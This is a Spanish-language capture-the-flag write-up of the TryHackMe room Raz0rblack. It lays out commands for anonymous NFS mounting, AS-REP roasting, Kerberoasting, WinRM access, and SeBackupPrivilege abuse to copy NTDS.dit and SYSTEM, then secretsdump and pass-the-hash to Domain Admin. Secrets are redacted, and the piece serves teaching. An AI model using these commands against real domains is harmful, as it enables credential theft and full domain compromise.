# Raz0rblack (TryHackMe) — de null a Domain Admin por SeBackupPrivilege

> **Writeup sanitizado.** Credenciales, hashes y flags van redactados (`<redacted>`). Es un recorrido de **metodología y lecciones**, no un walkthrough que trivialice la sala.

**Tipo:** Active Directory standalone · Windows Server 2019 · DC `HAVEN-DC`
**Resumen de la cadena:**
`NFS anónimo → directorio de personal → userlist (convención flast) → AS-REP roast → Kerberoast → WinRM → BloodHound sin ACLs → SeBackupPrivilege → NTDS.dit → Pass-the-Hash → DA`

---

## 1. Recon — leer las anomalías
Puertos de DC clásicos (Kerberos, LDAP, SMB, WinRM, RDP) **más dos rarezas que marcan el orden de ataque**:
- **NFS (2049) en un DC Windows** = rarísimo → superficie nº1.
- **Sin 445** (solo 139) → la enumeración SMB clásica no va; el user-enum tendrá que ir por **Kerberos**.

## 2. NFS anónimo → directorio de personal
```bash
showmount -e $IP
sudo mount -t nfs $IP:<export> /mnt/nfs
```
Dentro: una hoja de empleados (nombres + roles) y un `.txt` con el nombre de un usuario.

> **Lección — el propio fichero chiva la convención de nombres.** El `.txt` se llamaba como `inicial+apellido` → esa es la plantilla para generar los `sAMAccountName` de toda la plantilla (`awk` o `username-anarchy -f flast`).

## 3. AS-REP roast → primera credencial (sin tener nada)
```bash
impacket-GetNPUsers raz0rblack.thm/ -usersfile users -dc-ip $IP -no-pass -format hashcat -outputfile asrep.txt
hashcat -m 18200 asrep.txt rockyou.txt
```
> **Lección — GetNPUsers con lista hace doble función:** valida (los que no existen → `PRINCIPAL_UNKNOWN`) **y** rostiza (sin preauth → `$krb5asrep$`). "Sin salida" es ambiguo → kerbrute lo desambigua.
> **Gotcha hashcat:** guarda el hash con `-outputfile`; si lo pegas a mano, la shell se come los `$krb5asrep$23$` → "Signature unmatched".

## 4. Kerberoast (ya autenticado) → cuenta con WinRM
```bash
impacket-GetUserSPNs raz0rblack.thm/<user>:'<pass>' -dc-ip $IP -request -outputfile kerb.txt
hashcat -m 13100 kerb.txt rockyou.txt
```
> **Lección — orden por dependencias:** AS-REP (sin creds) → crackeas → **Kerberoast (con esa cred)**. Kerberoast nunca antes de tener credenciales.
> La columna **`MemberOf` es inteligencia:** la cuenta roasteada estaba en **Remote Management Users** → entra por **WinRM** (`evil-winrm`) = foothold + user flag.

## 5. BloodHound vacío → enumeración manual
Recolección autenticada (`bloodhound-python -ns <IP_DC> -c All`). Resultado: **ninguna de mis cuentas tiene outbound object control** → no hay cadena de ACLs.

> **Lección — BloodHound vacío ≠ callejón.** El grafo solo ve ACLs; no ve privilegios ni ficheros. Con shell ya en el DC, lo PRIMERO del árbol anti-pánico Windows: **`whoami /priv`**.
> `whoami /priv` → **`SeBackupPrivilege: Enabled`**. Ahí está el camino.

## 6. SeBackupPrivilege → NTDS.dit → Domain Admin
**Modelo mental:** `ntds.dit` (BD de AD con todos los hashes) está *locked* (lsass) y protegida por ACL. `SeBackupPrivilege` salta la ACL (`robocopy /b`); la **shadow copy** (`diskshadow`) resuelve el *locked* con una foto congelada del disco. Hace falta también el hive **SYSTEM** (boot key) para descifrarla.

```powershell
# shadow copy (script ASCII) + copia en modo backup
diskshadow /s shadow.txt
robocopy /b z:\windows\ntds\ <destino> ntds.dit   # /b = usa SeBackupPrivilege
reg save hklm\system <destino>\system.bak
```
```bash
impacket-secretsdump -ntds ntds.dit -system system.bak LOCAL   # -> hash NT del Administrator
evil-winrm -i $IP -u Administrator -H <redacted>               # Pass-the-Hash -> DA
```

> **Lección — SeBackupPrivilege = root en un DC.** No necesitas ser admin: con leer `ntds.dit` + `SYSTEM` tienes todos los hashes del dominio.

---

## Lecciones transversales
1. **Servicio anómalo = superficie nº1.** NFS en un DC Windows gritaba "mírame".
2. **Sin 445, el user-enum va por Kerberos** (kerbrute / GetNPUsers), no por SMB rid-brute.
3. **GetNPUsers con lista valida + rostiza** en un solo paso.
4. **Orden de roasting por dependencias:** AS-REP (sin creds) → Kerberoast (con creds).
5. **`MemberOf` es inteligencia** — "Remote Management Users" = WinRM directo.
6. **BloodHound sin aristas → enum manual + `whoami /priv`.** El privesc era un **privilegio**, no una ACL.
7. **SeBackupPrivilege:** diskshadow (desbloquea) + `robocopy /b` (salta ACL) + hive SYSTEM → NTDS → Pass-the-Hash.

> **Meta-lección:** tras un redeploy, `evil-winrm` dejó de entrar — no eran las credenciales, el **5985 estaba filtrado** (el nmap lo decía). No te obceques con las creds: lee el escaneo.
